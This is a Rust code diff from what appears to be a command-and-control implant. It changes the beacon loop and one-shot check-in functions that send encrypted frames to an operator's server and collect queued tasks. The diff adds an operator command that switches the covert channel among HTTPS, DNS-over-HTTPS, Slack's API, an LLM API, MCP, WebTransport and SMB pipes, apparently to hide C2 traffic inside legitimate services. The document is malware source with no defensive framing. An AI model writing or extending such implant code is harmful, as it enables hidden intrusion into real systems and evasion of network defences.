@@ -68,10 +68,9 @@ pub unsafe fn beacon_loop() {
     loop {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
-        let resp = crate::transport::post_frame(
+        let resp = crate::transport::channel_post_frame(
             cfg.server_host.as_bytes(),
             cfg.server_port,
-            cfg.beacon_uri.as_bytes(),
             &frame,
             cfg.use_tls,
         );
@@ -119,10 +118,9 @@ pub unsafe fn beacon_loop() {
         counter += 1;
         pending.clear();
 
-        let Some(body) = crate::transport::post_frame(
+        let Some(body) = crate::transport::channel_post_frame(
             cfg.server_host.as_bytes(),
             cfg.server_port,
-            cfg.beacon_uri.as_bytes(),
             &frame,
             cfg.use_tls,
         ) else {
@@ -155,10 +153,9 @@ pub unsafe fn beacon_loop() {
                 if pending_batch_size(&pending) > BATCH_FLUSH {
                     let frame =
                         encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("flush batch encodes within MAX_BLOB_LEN"));
-                    let _ = crate::transport::post_frame(
+                    let _ = crate::transport::channel_post_frame(
                         cfg.server_host.as_bytes(),
                         cfg.server_port,
-                        cfg.beacon_uri.as_bytes(),
                         &frame,
                         cfg.use_tls,
                     );
@@ -214,10 +211,9 @@ pub unsafe fn beacon_oneshot() -> u32 {
     for _ in 0..10 {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
-        if crate::transport::post_frame(
+        if crate::transport::channel_post_frame(
             cfg.server_host.as_bytes(),
             cfg.server_port,
-            cfg.beacon_uri.as_bytes(),
             &frame,
             cfg.use_tls,
         )
@@ -240,10 +236,9 @@ pub unsafe fn beacon_oneshot() -> u32 {
         // POST empty batch, receive any queued tasks.
         let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"));
         counter += 1;
-        let Some(body) = crate::transport::post_frame(
+        let Some(body) = crate::transport::channel_post_frame(
             cfg.server_host.as_bytes(),
             cfg.server_port,
-            cfg.beacon_uri.as_bytes(),
             &frame,
             cfg.use_tls,
         ) else {
@@ -279,10 +274,9 @@ pub unsafe fn beacon_oneshot() -> u32 {
         if !pending.is_empty() {
             let rframe = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("oneshot tail batch encodes within MAX_BLOB_LEN"));
             counter += 1;
-            let _ = crate::transport::post_frame(
+            let _ = crate::transport::channel_post_frame(
                 cfg.server_host.as_bytes(),
                 cfg.server_port,
-                cfg.beacon_uri.as_bytes(),
                 &rframe,
                 cfg.use_tls,
             );
@@ -335,6 +329,22 @@ fn execute(
                 SLEEP_SECS.store(seconds, core::sync::atomic::Ordering::Relaxed);
             }
             vec![Response::Ok]
+        }
+        Command::SetChannel { channel } => {
+            let ch = match channel {
+                0 => crate::transport::Channel::Https,
+                1 => crate::transport::Channel::DohDns,
+                2 => crate::transport::Channel::SlackApi,
+                3 => crate::transport::Channel::LlmApi,
+                4 => crate::transport::Channel::Mcp,
+                5 => crate::transport::Channel::WebTrans,
+                _ => crate::transport::Channel::SmbPipe,
+            };
+            crate::transport::set_channel(ch);
+            let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
+            out.extend_from_slice(b"Channel set to: ");
+            out.extend_from_slice(crate::transport::channel_name(ch).as_bytes());
+            vec![Response::Output(out)]
         }
         Command::Trex => {
             let assessment = unsafe { crate::trex::assess_user_mode() };
